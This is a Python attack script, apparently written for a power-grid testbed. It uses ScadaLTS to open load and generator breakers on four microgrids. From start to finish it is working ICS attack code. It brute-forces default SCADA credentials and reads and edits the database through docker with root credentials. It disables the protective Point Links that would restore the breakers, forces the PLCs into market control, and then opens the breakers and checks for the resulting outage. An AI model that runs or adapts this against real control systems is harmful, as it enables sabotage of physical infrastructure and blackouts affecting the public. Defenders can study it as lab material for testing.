#!/usr/bin/env python3
"""
SCADA-Path Attack: Open Downstream Breakers via ScadaLTS
========================================================
Simple, single-configuration attack for testing. Opens the downstream breaker
on every microgrid through the SCADA system — the LOAD breaker on the load
microgrids (MG1-MG3) and the GEN breaker on the generator microgrid (MG4):
  1. Brute force ScadaLTS credentials (admin:admin)
  2. Set Operator Mode on SCADA Gateway
  3. Disable the Point Links protecting each downstream breaker
     (and Market_Control Point Links where market mode is off)
  4. Ensure Market_Control = TRUE on each PLC (required for Cmd_Input to work)
  5. Open every downstream breaker (set <Downstream>_Cmd_Input = FALSE)

Point Links are ScadaLTS internal connections that continuously copy gateway
shed recommendations to PLC Cmd_Input coils. Without disabling them first, a
load breaker attack gets overwritten within ~1 second. (MG4's gen breaker has
no Point Link, so it opens without that step.)

Usage:
    # Open all downstream breakers (the attack)
    python attacks/scada_breaker_attack.py --all

    # Recon only (read current state, don't attack)
    python attacks/scada_breaker_attack.py --recon

    # Custom ScadaLTS URL / remote cluster
    python attacks/scada_breaker_attack.py --all --scada-url http://10.0.0.5:8090/Scada-LTS
    python attacks/scada_breaker_attack.py --all --env-file deployment/prod.env

MITRE ATT&CK ICS: T0866 (Default Credentials), T0831 (Manipulation of Control), T0806 (Brute Force I/O)
"""

import argparse
import os
import subprocess
import sys
import time
import requests

# Default env file location: prod.env sits one directory above this script
# on deployed VMs (e.g., /opt/powergrid/prod.env, with scripts in /opt/powergrid/attacks/).
# The env file only supplies service addresses (ScadaLTS host/port, gateway,
# PLCs); without it (or on localhost) the scripts fall back to localhost defaults.
DEFAULT_ENV_FILE = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), '..', 'prod.env'
)

# Microgrids targeted by this test attack (all four).
TARGETS = ['mg1', 'mg2', 'mg3', 'mg4']

# =============================================================================
# ScadaLTS Data Point IDs (from configure_scada.py)
# =============================================================================
SCADA_POINTS = {
    'operator_mode': {'id': 99, 'xid': 'DP_Operator_Mode'},
    'mg1': {
        'market_control': {'xid': 'DP_MG1_PLC_Market_Control'},
        'main_cmd': {'xid': 'DP_MG1_PLC_Main_Cmd_Input'},
        'load_cmd': {'xid': 'DP_MG1_PLC_Load_Cmd_Input'},
        'main_breaker': {'xid': 'DP_MG1_PLC_Main_Breaker_Closed'},
        'load_breaker': {'xid': 'DP_MG1_PLC_Load_Breaker_Closed'},
    },
    'mg2': {
        'market_control': {'xid': 'DP_MG2_PLC_Market_Control'},
        'main_cmd': {'xid': 'DP_MG2_PLC_Main_Cmd_Input'},
        'load_cmd': {'xid': 'DP_MG2_PLC_Load_Cmd_Input'},
        'main_breaker': {'xid': 'DP_MG2_PLC_Main_Breaker_Closed'},
        'load_breaker': {'xid': 'DP_MG2_PLC_Load_Breaker_Closed'},
    },
    'mg3': {
        'market_control': {'xid': 'DP_MG3_PLC_Market_Control'},
        'main_cmd': {'xid': 'DP_MG3_PLC_Main_Cmd_Input'},
        'load_cmd': {'xid': 'DP_MG3_PLC_Load_Cmd_Input'},
        'main_breaker': {'xid': 'DP_MG3_PLC_Main_Breaker_Closed'},
        'load_breaker': {'xid': 'DP_MG3_PLC_Load_Breaker_Closed'},
    },
    'mg4': {
        'market_control': {'xid': 'DP_MG4_PLC_Market_Control'},
        'main_cmd': {'xid': 'DP_MG4_PLC_Main_Cmd_Input'},
        'gen_cmd': {'xid': 'DP_MG4_PLC_Gen_Cmd_Input'},
        'main_breaker': {'xid': 'DP_MG4_PLC_Main_Breaker_Closed'},
        'gen_online': {'xid': 'DP_MG4_PLC_Gen_Online'},
    },
}


def downstream_of(mg_id):
    """Return the downstream breaker for an MG as (name, state_key, cmd_key).

    Load microgrids (mg1-3) shed customer load via the LOAD breaker; the
    generator microgrid (mg4) has no load breaker — its equivalent downstream
    breaker is GEN.
    """
    if mg_id == 'mg4':
        return ('gen', 'gen_online', 'gen_cmd')
    return ('load', 'load_breaker', 'load_cmd')


CREDENTIAL_LIST = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", ""),
    ("admin", "1234"),
    ("operator", "operator"),
    ("scada", "scada"),
]

# Point Links that protect each downstream breaker command and Market_Control.
# These continuously copy gateway values → PLC coils; disabling them stops the
# auto-overwrite so the attacker's value sticks. MG4's gen breaker has no
# Point Link, so mg4 lists only its Market_Control link.
POINT_LINK_MAP = {
    'mg1': {'load': 'PL_MG1_Load_Cmd', 'market_control': 'PL_MG1_Market_Control'},
    'mg2': {'load': 'PL_MG2_Load_Cmd', 'market_control': 'PL_MG2_Market_Control'},
    'mg3': {'load': 'PL_MG3_Load_Cmd', 'market_control': 'PL_MG3_Market_Control'},
    'mg4': {'market_control': 'PL_MG4_Market_Control'},
}


class ScadaAttacker:
    """Attack PLCs through ScadaLTS SCADA system."""

    def __init__(self, scada_url, verbose=False):
        self.base = scada_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        })
        self.verbose = verbose
        self.jsession = ''

    def log(self, msg):
        if self.verbose:
            print(f"  [*] {msg}")

    # ------------------------------------------------------------------
    # Authentication
    # ------------------------------------------------------------------
    def login(self):
        """Brute force ScadaLTS credentials."""
        print("[+] Phase 1: Brute forcing ScadaLTS credentials...")
        for username, password in CREDENTIAL_LIST:
            try:
                self.session.get(f"{self.base}/login.htm", timeout=5)
                resp = self.session.post(
                    f"{self.base}/login.htm",
                    data={"username": username, "password": password},
                    timeout=5, allow_redirects=True,
                )
                if "logout" in resp.text.lower() or "watch_list" in resp.url.lower():
                    print(f"    Credentials found: {username}:{password}")
                    # Load watch list page for DWR context
                    self.session.get(f"{self.base}/watch_list.shtm", timeout=5)
                    self.jsession = self.session.cookies.get('JSESSIONID', '')
                    return True
                self.log(f"Failed: {username}:{password}")
            except requests.RequestException:
                continue
        print("    [-] Brute force failed")
        return False

    # ------------------------------------------------------------------
    # Point read/write via ScadaLTS APIs
    # ------------------------------------------------------------------
    def read_point(self, xid):
        """Read point value via REST API."""
        try:
            resp = self.session.get(
                f"{self.base}/api/point_value/getValue/{xid}", timeout=5)
            if resp.status_code == 200:
                return resp.json().get('value')
        except Exception:
            pass
        return None

    def _get_point_id(self, xid):
        """Fetch numeric point ID by XID (getValue response contains {'id': N, ...})."""
        try:
            resp = self.session.get(
                f"{self.base}/api/point_value/getValue/{xid}", timeout=5)
            if resp.status_code == 200:
                return resp.json().get('id')
        except Exception:
            pass
        return None

    def resolve_point_ids(self):
        """Resolve numeric point IDs from XIDs at runtime.

        ScadaLTS point IDs drift every time the config is re-imported, so any
        hardcoded ID in SCADA_POINTS will break DWR setPoint calls with a
        NullPointerException. Populate/overwrite the 'id' field for every
        entry that has an 'xid', using the live getValue response.
        """
        self.log("Resolving point IDs from XIDs...")
        missing = []
        for key, val in SCADA_POINTS.items():
            if isinstance(val, dict) and 'xid' in val:
                pid = self._get_point_id(val['xid'])
                if pid is not None:
                    val['id'] = pid
                else:
                    missing.append(val['xid'])
            elif isinstance(val, dict):
                for sub_key, sub_val in val.items():
                    if isinstance(sub_val, dict) and 'xid' in sub_val:
                        pid = self._get_point_id(sub_val['xid'])
                        if pid is not None:
                            sub_val['id'] = pid
                        else:
                            missing.append(sub_val['xid'])
        if missing:
            print(f"    [-] Could not resolve IDs for: {', '.join(missing)}")
            return False
        self.log(f"Resolved IDs for all known points")
        return True

    def set_point_true(self, xid):
        """Set binary point to TRUE via REST API (POST with Content-Type: application/json)."""
        try:
            resp = self.session.post(
                f"{self.base}/api/point_value/setValue/{xid}/1",
                headers={'Content-Type': 'application/json'},
                data='1', timeout=5,
            )
            return resp.status_code == 200
        except Exception:
            return False

    def set_point_false(self, point_id):
        """Set binary point to FALSE via DWR (REST API doesn't support value=0)."""
        dwr_data = (
            f"callCount=1\n"
            f"page=/Scada-LTS/watch_list.shtm\n"
            f"httpSessionId={self.jsession}\n"
            f"scriptSessionId=\n"
            f"c0-scriptName=WatchListDwr\n"
            f"c0-methodName=setPoint\n"
            f"c0-id=0\n"
            f"c0-param0=number:{point_id}\n"
            f"c0-param1=string:0\n"
            f"c0-param2=number:0\n"
            f"batchId=1\n"
        )
        try:
            resp = self.session.post(
                f"{self.base}/dwr/call/plaincall/WatchListDwr.setPoint.dwr",
                data=dwr_data,
                headers={'Content-Type': 'text/plain'},
                timeout=10,
            )
            return 'remoteHandleCallback' in resp.text
        except Exception:
            return False

    # ------------------------------------------------------------------
    # Attack phases
    # ------------------------------------------------------------------
    def set_operator_mode(self):
        """Enable Operator Mode on SCADA Gateway (must be first)."""
        print("[+] Phase 2: Enabling Operator Mode...")
        xid = SCADA_POINTS['operator_mode']['xid']
        self.set_point_true(xid)
        time.sleep(1)
        val = self.read_point(xid)
        status = "OK" if val == 'true' else "FAILED"
        print(f"    [{status}] Operator_Mode = {val}")
        return val == 'true'

    def open_downstream_breaker(self, mg_id):
        """Open the downstream breaker on a microgrid (set Cmd_Input = FALSE)."""
        mg = SCADA_POINTS[mg_id]
        name, _, cmd_key = downstream_of(mg_id)
        ok = self.set_point_false(mg[cmd_key]['id'])
        status = "OK" if ok else "FAILED"
        print(f"    [{status}] {mg_id.upper()} {name}_cmd = 0 (OPEN)")
        return ok

    # ------------------------------------------------------------------
    # Point Link manipulation (disable to prevent auto-restore)
    # ------------------------------------------------------------------
    def get_point_links(self):
        """Get all Point Links from ScadaLTS database."""
        try:
            result = subprocess.run(
                ['docker', 'exec', 'scada_database', 'mysql', '-u', 'root', '-proot', 'scadalts',
                 '-e', 'SELECT id, xid, disabled FROM pointLinks;', '-N'],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode != 0:
                return []
            links = []
            for line in result.stdout.strip().split('\n'):
                if line:
                    parts = line.split('\t')
                    if len(parts) >= 3:
                        links.append({'id': int(parts[0]), 'xid': parts[1],
                                      'disabled': parts[2].upper() == 'Y'})
            return links
        except Exception as e:
            self.log(f"Error querying Point Links: {e}")
            return []

    def get_point_link_details(self, link_id):
        """Get full Point Link details needed for DWR savePointLink call."""
        try:
            result = subprocess.run(
                ['docker', 'exec', 'scada_database', 'mysql', '-u', 'root', '-proot', 'scadalts',
                 '-e', f'SELECT sourcePointId, targetPointId, script, eventType FROM pointLinks WHERE id={link_id};', '-N'],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0 and result.stdout.strip():
                parts = result.stdout.strip().split('\t')
                if len(parts) >= 4:
                    return {'sourcePointId': int(parts[0]), 'targetPointId': int(parts[1]),
                            'script': parts[2] if parts[2] != 'NULL' else '', 'eventType': int(parts[3])}
        except Exception:
            pass
        return None

    def set_point_link_disabled(self, link, disabled):
        """Enable or disable a single Point Link via DWR API."""
        details = self.get_point_link_details(link['id'])
        if not details:
            return False

        self.session.get(f"{self.base}/point_links.shtm", timeout=5)
        disabled_str = "true" if disabled else "false"
        save_data = (
            f"callCount=1\n"
            f"page=/Scada-LTS/point_links.shtm\n"
            f"httpSessionId={self.jsession}\n"
            f"scriptSessionId=\n"
            f"c0-scriptName=PointLinksDwr\n"
            f"c0-methodName=savePointLink\n"
            f"c0-id=0\n"
            f"c0-param0=number:{link['id']}\n"
            f"c0-param1=string:{link['xid']}\n"
            f"c0-param2=number:{details['sourcePointId']}\n"
            f"c0-param3=number:{details['targetPointId']}\n"
            f"c0-param4=string:{details['script']}\n"
            f"c0-param5=number:{details['eventType']}\n"
            f"c0-param6=boolean:{disabled_str}\n"
            f"batchId={link['id']}\n"
        )
        try:
            resp = self.session.post(
                f"{self.base}/dwr/call/plaincall/PointLinksDwr.savePointLink.dwr",
                data=save_data, headers={"Content-Type": "text/plain"}, timeout=10)
            return "exception" not in resp.text.lower()
        except Exception:
            return False

    def disable_downstream_point_links(self):
        """Disable the Point Links protecting each target's downstream breaker.

        Also disables Market_Control Point Links for MGs where Market_Control
        is FALSE (needed so the attacker can set it TRUE without overwrite).
        """
        # Collect XIDs that need disabling
        target_xids = set()
        for mg_id in TARGETS:
            name, _, _ = downstream_of(mg_id)
            # Downstream breaker Point Link (mg4's gen has none)
            if name in POINT_LINK_MAP[mg_id]:
                target_xids.add(POINT_LINK_MAP[mg_id][name])
            # Market_Control Point Link — disable if Market_Control is off
            # (otherwise gateway will overwrite our TRUE back to FALSE)
            mkt = self.read_point(SCADA_POINTS[mg_id]['market_control']['xid'])
            if mkt != 'true':
                target_xids.add(POINT_LINK_MAP[mg_id]['market_control'])

        # Get all Point Links from DB
        all_links = self.get_point_links()
        if not all_links:
            print("    [-] Cannot query Point Links (database unreachable)")
            return

        # Disable matching links
        for link in all_links:
            if link['xid'] in target_xids:
                ok = self.set_point_link_disabled(link, disabled=True)
                status = "OK" if ok else "FAILED"
                print(f"    [{status}] {link['xid']} DISABLED")

    def ensure_market_control(self):
        """Ensure Market_Control is TRUE on all targets.

        Without Market_Control = TRUE, the PLC ignores Cmd_Input entirely
        (runs in AUTO mode with safe defaults).
        """
        for mg_id in TARGETS:
            mg = SCADA_POINTS[mg_id]
            mkt = self.read_point(mg['market_control']['xid'])
            if mkt == 'true':
                print(f"    {mg_id.upper()} Market/SuperCtrl = true (already active)")
            else:
                self.set_point_true(mg['market_control']['xid'])
                time.sleep(0.5)
                val = self.read_point(mg['market_control']['xid'])
                status = "OK" if val == 'true' else "FAILED"
                print(f"    [{status}] {mg_id.upper()} Market/SuperCtrl = {val}")

    # ------------------------------------------------------------------
    # Recon
    # ------------------------------------------------------------------
    def recon(self):
        """Read and display current state of all target microgrids."""
        print("[+] Current grid state (via ScadaLTS):")
        print()
        op = self.read_point(SCADA_POINTS['operator_mode']['xid'])
        print(f"  Operator_Mode = {op}")
        print()

        for mg_id in TARGETS:
            mg = SCADA_POINTS[mg_id]
            name, state_key, cmd_key = downstream_of(mg_id)
            mkt_ctrl = self.read_point(mg['market_control']['xid'])
            main = self.read_point(mg['main_breaker']['xid'])
            down = self.read_point(mg[state_key]['xid'])
            main_cmd = self.read_point(mg['main_cmd']['xid'])
            down_cmd = self.read_point(mg[cmd_key]['xid'])
            status = "BLACKOUT" if main == 'false' else "online"
            label = name.capitalize()
            print(f"  {mg_id.upper()} [{status}]: Main={main} {label}={down} Market/SuperCtrl={mkt_ctrl}")
            print(f"    Commands: MainCmd={main_cmd} {label}Cmd={down_cmd}")
            print()


def main():
    parser = argparse.ArgumentParser(
        description="SCADA-Path Attack: Open all downstream breakers via ScadaLTS",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Open all downstream breakers (load on mg1-3, gen on mg4)
    python attacks/scada_breaker_attack.py --all

    # Read current state only
    python attacks/scada_breaker_attack.py --recon
        """
    )
    parser.add_argument('--all', action='store_true',
                        help='Open the downstream breaker on every microgrid '
                             '(load on MG1-MG3, gen on MG4)')
    parser.add_argument('--recon', action='store_true',
                        help='Read current state only (no attack)')
    parser.add_argument('--scada-url', default='http://localhost:8080/Scada-LTS',
                        help='ScadaLTS base URL')
    parser.add_argument('--env-file', default=DEFAULT_ENV_FILE,
                        help=f'Load service addresses from env file (default: {DEFAULT_ENV_FILE})')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output')

    args = parser.parse_args()

    # Override defaults from env file (explicit CLI args take priority).
    # Silently skip if the default path doesn't exist (e.g., running from dev tree).
    if args.env_file and os.path.isfile(args.env_file):
        from env_loader import load_env_file, resolve_addresses
        addrs = resolve_addresses(load_env_file(args.env_file))
        if args.scada_url == 'http://localhost:8080/Scada-LTS':
            args.scada_url = addrs['scada_url']

    if not args.all and not args.recon:
        parser.print_help()
        sys.exit(1)

    print("=" * 60)
    print("  SCADA-Path Attack: Open Downstream Breakers via ScadaLTS")
    print("=" * 60)
    print(f"  Target: {args.scada_url}")
    mode = "Recon" if args.recon else "Attack"
    print(f"  Mode: {mode}")
    print()

    attacker = ScadaAttacker(args.scada_url, verbose=args.verbose)

    # Phase 1: Login
    if not attacker.login():
        sys.exit(1)

    # Resolve point IDs from XIDs (they drift on each ScadaLTS config re-import,
    # so any hardcoded ID in SCADA_POINTS is unreliable).
    if not attacker.resolve_point_ids():
        print("    [!] Some point IDs could not be resolved; writes may fail")

    # Recon mode
    if args.recon:
        attacker.recon()
        sys.exit(0)

    # Attack mode
    # Phase 2: Operator Mode
    if not attacker.set_operator_mode():
        print("    [!] Operator Mode may not have taken effect, continuing anyway...")

    # Phase 3: Disable Point Links protecting the downstream breakers
    # Point Links continuously copy gateway shed recs → PLC Cmd_Input coils.
    # Without disabling, load attacks get overwritten within ~1s.
    # Also disables Market_Control Point Link if MG is in AUTO mode.
    print()
    print("[+] Phase 3: Disabling Point Links (preventing SCADA auto-restore)...")
    attacker.disable_downstream_point_links()

    # Phase 4: Ensure Market_Control is TRUE (PLC must be in market mode)
    # Without this, PLC ignores Cmd_Input and runs AUTO defaults.
    print()
    print("[+] Phase 4: Ensuring Market/Super Control is active...")
    attacker.ensure_market_control()

    # Phase 5: Open downstream breakers
    print()
    print("[+] Phase 5: Opening downstream breakers...")
    for mg_id in TARGETS:
        attacker.open_downstream_breaker(mg_id)
        time.sleep(0.3)

    # Phase 6: Verify
    time.sleep(3)
    print()
    print("[+] Phase 6: Verifying attack...")
    attacker.recon()

    print("=" * 60)
    print("  Attack complete!")
    print("=" * 60)


if __name__ == '__main__':
    main()
